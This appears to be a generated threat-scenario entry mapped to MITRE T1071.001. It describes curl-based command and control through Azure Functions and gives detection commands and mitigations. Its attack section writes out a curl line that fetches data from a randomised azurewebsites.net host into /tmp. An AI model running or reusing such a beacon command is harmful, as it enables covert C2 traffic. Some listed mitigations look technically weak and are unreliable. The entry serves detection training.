---
type: campaign
scenario_id: 472
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with Azure Functions for C2.

## Threat Description
Using curl to communicate with Azure Functions for C2.

## Attack Command
```
curl -H "x-functions-key: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).azurewebsites.net/api/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl Azure: `ps aux | grep curl | grep azurewebsites.net`; Network traffic: `tcpdump -i any host azurewebsites.net`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block Azure Functions: `iptables -A OUTPUT -d azurewebsites.net -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via Azure Functions by analyzing HTTP headers, Azure Functions URLs, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
